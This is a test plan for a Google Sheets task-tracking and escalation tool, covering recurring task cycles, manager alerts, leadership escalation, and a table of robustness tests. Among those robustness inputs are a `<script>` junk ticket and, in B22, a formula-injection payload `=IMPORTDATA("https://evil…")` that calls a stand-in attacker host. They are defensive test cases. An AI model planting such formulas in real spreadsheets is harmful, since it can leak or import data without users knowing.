# 03 — Test Plan

All tests live in `src/12_Tests.js` and run identically in Google Sheets (menu → Run automated tests) and locally (`npm test`).
Fixture: Mon 16 Nov 2026 (Mon–Sat working days, cut-off 18:00), Employees A–D, manager `manager@allo.test`, leadership `ceo@`, `coo@`.

| Task | Owner | Frequency | First due |
|---|---|---|---|
| T01 Daily Operations Update | Employee A | Daily | Mon 16 Nov |
| T02 Portal Task A | Employee B | Every 7 days | Mon 16 Nov |
| T03 Portal Task B | Employee C | Every 15 days | Wed 18 Nov |
| T04 Portal Task C | Employee D | Every 30 days | Sat 21 Nov |
| T05 Weekly Vendor Recon (extra) | Employee A | Every 7 days | Sun 22 Nov → due Mon 23 |

## Assignment tests

| ID | Assignment test | Scenario | Pass criteria |
|---|---|---|---|
| T1 | Recurring cycle | Complete T02/T03/T04 with tickets | DONE + who/when/proof; next cycle at +7/+15/+30 with the window = previous cut-off; 3× engine → 1 OPEN each |
| T2 | Single-point completion | Type a ticket in Employee B's tab | Ledger, Activity Log, dashboard updated from that one edit; replay of the edit → no duplicate |
| T3 | Daily task | Employee A pastes the update | "done" rejected; valid text completes; share link rendered; Tue cycle created; identical repeat rejected; no Sunday cycle |
| T4 | Same-day manager alert | Nothing done Monday | 15:59 no reminder → 16:00 reminder; 18:29 no alert → 18:31 one batched alert to the manager, same day |
| T5 | Manager acknowledgement | Dashboard ✅ with note, web link | Ack recorded; forged link rejected; GET has no side effects; later completion shown; no escalation |
| T6 | Leadership escalation | (a) no ack (b) ack but not done | (a) 10:59 none → 11:01 escalation "not acknowledged"; (b) 18:01 next day "not completed"; resolved notice once |
| T7 | Escalation timing | Deadline maths | Mon–Sat & Mon–Fri calendars, Friday/Saturday alerts skip non-working days; no escalation on Sunday |
| T8 | No duplicates | Repeated runs, mail outage, double completion | Counts stable; failed send retried once; one COMPLETED log |

## Robustness ("try to break it") tests

| ID | Attack / edge case | Expected |
|---|---|---|
| B01 | Junk tickets: `''`, `done`, `12`, `<script>`, 60-char string, `PRT 123` | Rejected with reason, cycle stays OPEN |
| B02 | Re-use last week's ticket | Rejected ("already used for …") |
| B03 | Submit next period early | Rejected ("opens on …") |
| B04 | Complete 9 days late | LATE_DONE, missed slot SKIPPED, next OPEN in future |
| B05 | Deactivate, then reactivate a task | OPEN → WAIVED, no alerts; fresh future cycle, no backfill |
| B06 | Reassign task | OPEN cycle moves to the new owner's tab |
| B07 | Multi-row paste; edits in non-input columns | Each row processed; others ignored |
| B08 | Stale row (already done) / unknown Cycle ID / another employee's cycle | Friendly message, no change |
| B09 | Duplicate Task ID, unknown employee, bad frequency, bad time | Health shows the reason; valid tasks unaffected |
| B10 | Broken config (bad email, bad time, bad regex, bad mode) | Defaults used, warnings shown, engine runs |
| B11 | Manager waives (leave) | WAIVED, next cycle scheduled, no escalation |
| B12 | Ack before the alert is due | Alert suppressed; resolve deadline still enforced |
| B13 | Manager unticks ack | Ignored; ack retained |
| B14 | Weekend handling | Interval due on Sunday → Monday; no daily cycle on Sunday |
| B15 | Setup re-run on live data / missing sheet | Data preserved; sheet recreated |
| B16 | Employee tab deleted / employee deactivated | Tab regenerated / removed; tasks flagged |
| B17 | Corrupted ledger row | Preserved verbatim, skipped, warning shown |
| B18 | Daily update copy-paste of yesterday; 6000-char paste | Rejected |
| B19 | Mail quota exhausted / manager email missing | FAILED logged, retried later; no crash |
| B20 | Ack link tampering (other cycle ID, bad signature) | Rejected |
| B21 | The 15-minute refresh redraws the tab while the employee is typing | Nothing applied to a possibly different row; user asked to re-enter |
| B22 | Formula injection: proof text `=IMPORTDATA("https://evil…")` | Stored and shown as plain text everywhere; our own share-link formula still works |

Also covered inside existing tests: holidays (B14) and a cut-off too late for a same-day alert, which is warned about in Health (B09).

## Node-only checks (`test/run.js`)
Lock busy → engine skips and the edit asks for a retry · triggers installed idempotently · `onOpen` menu builds · setup on a blank spreadsheet · bundle file is generated · the in-sheet test runner writes `Test Results` and trashes its sandbox.
